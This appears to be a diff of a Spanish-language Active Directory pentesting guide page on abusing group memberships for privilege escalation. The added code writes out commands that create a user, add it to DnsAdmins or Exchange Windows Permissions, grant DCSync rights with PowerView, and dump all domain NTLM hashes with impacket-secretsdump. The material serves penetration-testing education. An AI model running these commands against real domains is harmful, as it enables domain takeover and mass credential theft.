@@ -13,32 +13,45 @@
 <h3>◍ Ataque</h3>
 
 <p class="mainText">
-    Inicialmente deberíamos comprobar si estamos en un proceso ejecutado como administrador, porque se necesita pasar a un nivel alto 
-    de integridad para poder utilizar los permosos. En caso de no estar como administrador seguir las técnicas  
-    sugeridas en la sección de <b><span href="#info/UAC" class="internal_link text-success">Técnicas de bypass del UAC</span></b>.
-</p>
-<div class="list-group">
-    <a role="button" href="#info/UAC" class="internal_link list-group-item list-group-item-secondary list-group-item-action">&#x21AA; Técnicas de bypass del UAC</a>
-</div>
-<br>
-<p class="mainText">
     Aunque no se puede agregar a un usuario como administrador, existen varias alternativas para la escalada de privilegios, como por ejemplo 
-    agregar a un usuario al grupo <b><span href="#groups/DNSAdmins" class="internal_link text-success">DNSAdmins</span></b> o ponerlo como 
-    <b><span href="#groups/ExchangeWindowsPermissions" class="internal_link text-success">“Exchange Windows Permissions”</span></b> y utilizar las técnicas 
+    agregar a un usuario al grupo <b><span href="#groups/DnsAdmins" class="internal_link text-success">DNSAdmins</span></b> o ponerlo como 
+    <b><span href="#groups/ExchangeWindowsPermissions" class="internal_link text-success">Exchange Windows Permissions</span></b> y utilizar las técnicas 
     de escalada de cada caso.
 </p>
 
+<p class="mainText">
+    Para DNS Admins:
+</p>
 <!-- Code snipet-->
 <div class="snipet_custom position-relative">
 <pre class="code_snipet"><code data-language="shell">#Se puede crear un nuevo usuario
 net user [user] [password] /add
 #Añadirlo a Dns Admins
 net localgroup "DnsAdmins" [user] /add
-#O añadirlo a Exchange Windos Permissions
-net group "Exchange Windows Permissions" [user] /add
 </code></pre>
 </div>
 <!-- Code-->
+
+
+<p class="mainText">
+    Para Exchange Windows Permissions:
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">
+#Añade permisos a Exchange Windos Permissions
+net group "Exchange Windows Permissions" [user] /add
+
+#Añade permisos de DCSync con PowerShell
+Import-module .\PowerView.ps1
+Add-DomainObjectACL -TargetIdentity 'DC=com,DC=domain' -PrincipalIdentity [user] -Rights DCSync
+
+#Ahora se puede sacar todos los hashes NTLM del AD
+impacket-secretsdump [domain]/[user]:[password]@[IP]
+</code></pre>
+</div>
+<!-- Code-->
+
 
 <p class="mainText">
     Y continuar con la explotación del grupo <b>DNSAdmins</b> o <b>ExchangeWindowsPermissions</b> (es posible que tengas que cerrar sesión y abrirla de nuevo para ver los cambios)
